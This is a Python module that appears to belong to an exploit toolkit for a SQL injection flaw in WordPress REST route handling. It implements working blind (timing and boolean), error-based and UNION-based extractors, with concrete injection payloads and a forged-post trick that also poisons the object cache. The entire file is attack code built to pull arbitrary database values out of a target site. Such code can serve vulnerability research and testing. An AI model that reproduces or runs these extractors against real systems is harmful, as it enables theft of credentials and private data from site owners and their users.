"""Blind SQL injection oracles and a string extractor over the route-confusion sink.

The injected value lands inside the query as:

    ... post_author NOT IN (<value>) ...

so a value of ``0) <sql>-- -`` closes the IN() list and appends arbitrary SQL.
"""

from __future__ import annotations

import html
import re
import statistics
from dataclasses import dataclass
from typing import Callable, Optional, Tuple

from .client import BatchClient

_MIN_PRINTABLE = 32
_MAX_PRINTABLE = 126


@dataclass
class TimingConfirmation:
    confirmed: bool
    baseline: float
    delayed: float
    delta: float
    threshold: float
    samples: Tuple[Tuple[float, float], ...]


class BlindSQLi:
    def __init__(self, client: BatchClient, *, sleep: float = 3.0) -> None:
        self.client = client
        self.sleep = sleep
        self.requests = 0

    def confirm_timing(self, *, samples: int = 3) -> TimingConfirmation:
        """Confirm injectability with paired timing samples.

        Network jitter makes a single baseline/delayed pair brittle, so this alternates
        baseline and delayed requests and compares median paired deltas.
        """
        if samples < 1:
            raise ValueError("samples must be at least 1")

        pairs = []
        for _ in range(samples):
            baseline = self._elapsed("SLEEP(0)")
            delayed = self._elapsed(f"SLEEP({self.sleep:g})")
            pairs.append((baseline, delayed))

        baselines = [pair[0] for pair in pairs]
        delayed = [pair[1] for pair in pairs]
        deltas = [delay - base for base, delay in pairs]
        baseline_median = statistics.median(baselines)
        delayed_median = statistics.median(delayed)
        delta_median = statistics.median(deltas)
        threshold = max(0.75, self.sleep * 0.65)
        confirmed = delta_median >= threshold
        return TimingConfirmation(
            confirmed=confirmed,
            baseline=baseline_median,
            delayed=delayed_median,
            delta=delta_median,
            threshold=threshold,
            samples=tuple(pairs),
        )

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 128,
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        """Read a string-valued SQL expression one character at a time (binary search)."""
        chars = []
        for position in range(1, max_length + 1):
            # COALESCE keeps a NULL result from short-circuiting into an empty read.
            probe = f"ASCII(SUBSTRING(COALESCE(({expression}),''),{position},1))"
            if not self._true(f"{probe} > 0"):
                break
            low, high = _MIN_PRINTABLE, _MAX_PRINTABLE
            while low < high:
                mid = (low + high) // 2
                if self._true(f"{probe} > {mid}"):
                    low = mid + 1
                else:
                    high = mid
            chars.append(chr(low))
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def integer(self, expression: str) -> int:
        """Read an integer-valued SQL expression.

        Raises ValueError when the extracted text is not an integer, so a
        failed extraction cannot be mistaken for a real count of zero.
        """
        text = self.extract(expression).strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expression!r}, got {text!r}")
        return int(text)

    def _elapsed(self, sql: str) -> float:
        self.requests += 1
        return self.client.inject(f"0) OR {sql}-- -").elapsed

    def _true(self, condition: str) -> bool:
        # Read X-WP-Total, not the body: the item-route source sends no `page`, so get_items() can
        # paginate to an empty body even when rows match. `NOT IN (-1)` matches every post.
        self.requests += 1
        count = self.client.match_count(self.client.inject(f"-1) AND ({condition})-- -"))
        if count is None:
            raise RuntimeError("blind SQLi oracle did not return X-WP-Total")
        return count > 0


class ErrorBasedSQLi:
    """In-band error-based extractor for targets that echo MySQL errors in the response.

    When the target shows database errors (``WP_DEBUG_DISPLAY`` on, or ``$wpdb->show_errors``),
    ``EXTRACTVALUE()`` leaks a value inside an ``XPATH syntax error`` message that is reflected in
    the batch response body. This reads a whole ~15-byte chunk per request instead of one bit per
    request, so it is far faster than the blind binary search, while reaching the same sink. It is
    still strictly read-only.

    Values are pulled out HEX-encoded so the transport is binary-safe (no quote/entity/newline
    surprises and no dependence on the value's character set).
    """

    # EXTRACTVALUE reports up to 32 chars of the offending string; 0x7e ('~') marks our data.
    _HEX_RE = re.compile(r"XPATH syntax error: '~([0-9A-Fa-f]*)")
    _STR_RE = re.compile(r"XPATH syntax error: '~([^']*)")
    _CHUNK = 15  # bytes per request -> 30 hex chars -> '~' + 30 = 31 < 32-char error cap

    def __init__(self, client: BatchClient) -> None:
        self.client = client
        self.requests = 0

    def available(self) -> bool:
        """Return True if the target reflects EXTRACTVALUE errors (error-based is usable)."""
        return self._leak_hex("SELECT 0x414243") == b"ABC"  # 'ABC'

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 256,
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        length_text = self._leak_str(f"SELECT LENGTH(COALESCE(({expression}),''))")
        if length_text is None or not length_text.strip().isdigit():
            return ""
        length = min(int(length_text.strip()), max_length)

        out = bytearray()
        offset = 1
        while offset <= length:
            chunk = self._leak_hex(
                f"SELECT SUBSTRING(COALESCE(({expression}),''),{offset},{self._CHUNK})"
            )
            if not chunk:
                break
            out.extend(chunk)
            offset += len(chunk)
            if on_char:
                on_char(out.decode("utf-8", "replace"))
            if len(chunk) < self._CHUNK:
                break
        return out.decode("utf-8", "replace")

    def integer(self, expression: str) -> int:
        text = (self._leak_str(f"SELECT ({expression})") or "").strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expression!r}, got {text!r}")
        return int(text)

    def _leak_hex(self, expression: str) -> Optional[bytes]:
        text = self._send(f"HEX(({expression}))")
        match = self._HEX_RE.search(text)
        if not match:
            return None
        digits = match.group(1)
        if len(digits) % 2:  # defensive: drop a half-byte if the error truncated mid-pair
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits)
        except ValueError:
            return None

    def _leak_str(self, expression: str) -> Optional[str]:
        text = self._send(f"({expression})")
        match = self._STR_RE.search(text)
        return match.group(1) if match else None

    def _send(self, inner: str) -> str:
        self.requests += 1
        payload = f"0) OR EXTRACTVALUE(1,CONCAT(0x7e,{inner}))-- -"
        return html.unescape(self.client.inject(payload).body)


class UnionSQLi:
    """In-band UNION extractor: forges a fake ``WP_Post`` row and reads its reflected title.

    Uses the single-post-route confusion (see ``BatchClient.union_inject``) to reach a non-split,
    no-``ORDER BY`` posts query, then ``UNION SELECT``s a full ``wp_posts.*`` row whose
    ``post_title`` carries ``||HEX(value)||``. The forged post is returned in the REST collection
    response, so a whole value comes back in a single request — no blind search, no reliance on
    reflected DB errors. This also demonstrates the fake-``WP_Post`` object-cache poisoning
    primitive (the row is added to the ``posts`` cache for the rest of the request). Read only.
    """

    _COLUMNS = 23  # wp_posts column count (stable across modern WordPress)
    _TITLE_COL = 6  # post_title is rendered back in the REST response
    _RE = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")
    # 'publish' / 'post' / a valid datetime keep the forged row a readable, renderable post.
    _PUBLISH = "0x7075626c697368"
    _POST = "0x706f7374"
    _DATE = "0x323032302d30312d30312030303a30303a3030"

    def __init__(self, client: BatchClient) -> None:
        self.client = client
        self.requests = 0

    def available(self) -> bool:
        """Return True if the target reflects a UNION-forged post (union extraction is usable)."""
        return self._read("SELECT 0x4f4b") == "OK"

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 0,  # accepted for interface parity; a UNION reads the whole value at once
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        value = self._read(expression)
        if value and on_char:
            on_char(value)
        return value or ""

    def integer(self, expression: str) -> int:
        text = (self._read(f"SELECT ({expression})") or "").strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expression!r}, got {text!r}")
        return int(text)

    def _read(self, expression: str) -> Optional[str]:
        self.requests += 1
        response = self.client.union_inject(f"0) UNION SELECT {self._columns(expression)}-- -")
        match = self._RE.search(response.body)
        if not match:
            return None
        digits = match.group(1)
        if len(digits) % 2:
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits).decode("utf-8", "replace")
        except ValueError:
            return None

    def _columns(self, expression: str) -> str:
        columns = []
        for index in range(1, self._COLUMNS + 1):
            if index == 1:
                columns.append("999999")  # ID (fake, unused post id)
            elif index in (3, 4, 15, 16):
                columns.append(self._DATE)  # post_date / *_gmt / post_modified / *_gmt
            elif index == self._TITLE_COL:
                columns.append(f"CONCAT(0x7c7c,HEX(CAST(({expression})AS CHAR)),0x7c7c)")
            elif index == 8:
                columns.append(self._PUBLISH)  # post_status
            elif index == 21:
                columns.append(self._POST)  # post_type
            else:
                columns.append(str(index))
        return ",".join(columns)
